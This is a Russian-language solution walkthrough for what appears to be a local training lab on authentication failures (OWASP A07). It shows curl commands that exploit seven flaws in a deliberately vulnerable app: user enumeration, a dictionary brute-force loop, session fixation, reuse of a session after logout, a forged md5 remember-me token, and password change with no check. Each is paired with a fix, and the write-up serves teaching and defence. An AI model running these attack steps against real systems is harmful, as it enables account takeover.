# A07 — Разбор решения (спойлеры)

Все примеры — `curl` на `http://127.0.0.1:8061` (vulnerable). Там, где важны
куки, используем `-c cookies.txt -b cookies.txt`.

## Дефект 1 — слабая парольная политика

```bash
curl -s -X POST http://127.0.0.1:8061/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"eve","password":"1"}'
# {"ok": true} — пароль "1" принят без вопросов
```

**Правило:** регистрация — единственная точка, где можно не пустить слабый
пароль в систему. Тестовый аккаунт `bob` в этой лабе создан с паролем
`123456` именно потому, что в прошлом эта проверка отсутствовала — слабые
пароли «живут» в базе годами, если их не остановили на входе.

**Fix:** `password_policy_error()` — минимум 8 символов и запрет
распространённых паролей (`# FIX 1`, применяется и в `/register`, и в
`/change-password`).

## Дефект 2 — перечисление пользователей

```bash
curl -s -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' -d '{"username":"nosuchuser","password":"x"}'
# 404 "пользователь не найден"

curl -s -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' -d '{"username":"alice","password":"wrong"}'
# 401 "неверный пароль"
```

По разнице кода и текста ответа можно перебором собрать список
существующих логинов, даже не зная ни одного пароля.

**Fix:** один и тот же код и сообщение `401 "неверный логин или пароль"` в
обоих случаях (`# FIX 2`).

## Дефект 3 — нет защиты от перебора (brute force)

```bash
for pw in 111111 password 123456 qwerty 12345678; do
  r=$(curl -s -X POST http://127.0.0.1:8061/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"bob\",\"password\":\"$pw\"}")
  echo "$pw -> $r"
done
# pw=123456 -> {"ok": true, "role": "user", "user": "bob"}
```

Ни пауз, ни капчи, ни блокировки — короткий словарь вскрывает аккаунт с
паролем `123456` за секунды.

**Fix:** счётчик неудачных попыток на логин, блокировка на 60 секунд после
5 подряд неудач (`# FIX 3`). Вместе с FIX 2 это и защита от перебора, и
отсутствие утечки, какой из параметров был неверным.

## Дефект 4 — session fixation

Ключевая идея: сервер выдаёт `sid` ещё до входа (на `GET /`) и **не меняет
его** после успешной аутентификации. Значит, если у двух сторон случайно
или намеренно оказался один и тот же `sid` до входа, после входа одной из
них вторая тоже получает доступ.

```bash
# 1. "Атакующий" получает sid ДО какого-либо входа
curl -s -c atk.txt http://127.0.0.1:8061/ > /dev/null
ATK_SID=$(grep sid atk.txt | awk '{print $7}')
echo "sid атакующего: $ATK_SID"

# 2. "Жертва" (admin) входит, используя ИМЕННО этот sid
#    (в реальной атаке жертву заставляют открыть ссылку с этим sid,
#    здесь для демонстрации переиспользуем его напрямую)
curl -s -b "sid=$ATK_SID" -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Adm1n-Str0ng-Pass!2025"}'

# 3. Атакующий использует СВОЙ старый cookie-файл — sid в нём authenticated как admin
curl -s -b atk.txt http://127.0.0.1:8061/admin
# {"flag": "FLAG{A07_remember_me_token_is_just_md5_of_username}", ...}
```

**Правило:** идентификатор сессии обязан считаться скомпрометированным,
если он существовал до момента входа. Доверять ему после аутентификации
нельзя — нужен новый.

**Fix:** `fixed/app.py` вообще не выдаёт `sid` до входа (`GET /` больше не
создаёт анонимную сессию), а при успешном `/login` всегда генерируется
новый `sid`, старый (если был прислан) удаляется (`# FIX 4`).

## Дефект 5 — logout не инвалидирует сессию на сервере

```bash
curl -s -c s.txt -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice-Good-Pass1"}'
SID=$(grep sid s.txt | awk '{print $7}')

curl -s -b s.txt -X POST http://127.0.0.1:8061/logout
# {"ok": true, "message": "вы вышли"}

curl -s -b "sid=$SID" http://127.0.0.1:8061/me
# {"role": "user", "user": "alice"} — сессия всё ещё активна!
```

Если `sid` был перехвачен (украденный cookie, XSS, публичный компьютер) до
того, как владелец нажал «выйти», «выход» ничего не меняет для похитителя.

**Fix:** `/logout` удаляет запись из серверного `SESSIONS` (и связанный
`remember_token` из `REMEMBER`), а не только куки в ответе (`# FIX 5`).

## Дефект 6 — предсказуемый токен «запомнить меня»

Токен в `vulnerable/app.py` — это `md5(username)`, его можно вычислить,
вообще не обращаясь к серверу:

```bash
python3 -c "import hashlib; print(hashlib.md5(b'admin').hexdigest())"
# -> конкретное значение, например 21232f297a57a5a743894a0e4a801fc3

curl -s -c a.txt -b "remember_token=21232f297a57a5a743894a0e4a801fc3" \
  http://127.0.0.1:8061/auto-login
# {"ok": true, "user": "admin", "note": "вход по remember_token"}

curl -s -b a.txt http://127.0.0.1:8061/admin
# флаг
```

Единственное, что нужно знать атакующему, — это логин `admin` (не секрет).

**Правило:** постоянный токен — это такой же секрет, как пароль. Его
нельзя вычислять детерминированно из публичных данных; это должно быть
случайное значение с достаточной энтропией, которое сервер хранит и
сверяет, а не пересчитывает.

**Fix:** `secrets.token_urlsafe(32)`, на сервере хранится только
`sha256`-хэш токена с временем истечения; токен ротируется при каждом
использовании (`# FIX 6`).

## Дефект 7 — смена пароля без текущего пароля

Имея любую активную (в том числе угнанную) сессию:

```bash
curl -s -b atk.txt -X POST http://127.0.0.1:8061/change-password \
  -H 'Content-Type: application/json' -d '{"new_password":"hacked-by-attacker"}'
# {"ok": true, "message": "пароль изменён"} — админ пароля не вводил!
```

Это превращает *любой* временный захват сессии (через дефекты 1, 4 или 6) в
*постоянную* потерю аккаунта: пароль меняется, и легитимный владелец
больше не может войти.

**Fix:** `/change-password` требует `current_password`, сверяется через
`hmac.compare_digest`, и к новому паролю применяется та же политика, что
при регистрации (`# FIX 7`).

## Итог

Ни один из семи дефектов не живёт в одной уязвимой функции вроде `eval()`
или конкатенации SQL-строки — каждый про то, **какое решение не было
принято при проектировании аутентификации**: когда перевыпускать
идентификатор сессии, что считать секретом, сколько попыток разрешить,
какой ответ не должен ничего выдавать и когда требовать повторного
подтверждения личности. Это полностью в духе A06 Insecure Design, но
сфокусировано именно на «кто ты» — отсюда и отдельная категория A07.
